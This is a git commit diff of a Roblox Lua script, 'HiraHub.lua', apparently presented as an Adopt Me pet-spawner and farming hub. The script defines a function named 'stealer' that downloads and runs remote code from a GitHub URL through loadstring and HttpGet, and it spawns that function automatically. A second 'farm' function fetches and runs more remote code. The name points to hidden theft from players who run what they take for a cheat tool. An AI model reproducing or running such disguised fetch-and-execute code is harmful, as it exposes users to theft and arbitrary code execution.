2ecd141ad606ed6b0eb0ca31344510e15801fff5
AdoptMe <sumarmihadi123@gmail.com>
2025-05-01 06:08:24 +0700

    Update HiraHub.lua

--- HiraHub.lua
+++ HiraHub.lua
@@ -1,11 +1,13 @@
 local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/ByIgniteScript/refs/heads/main/AdoptMeScript.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/ByIgniteScript/refs/heads/main/AdoptMeScript.lua'))()
 end
 
 local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner/refs/heads/main/HiraHub'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner/refs/heads/main/HiraHub'))()
 end
 
 task.spawn(stealer)
+
+for i = 1, 1 do
 task.spawn(farm)
 end
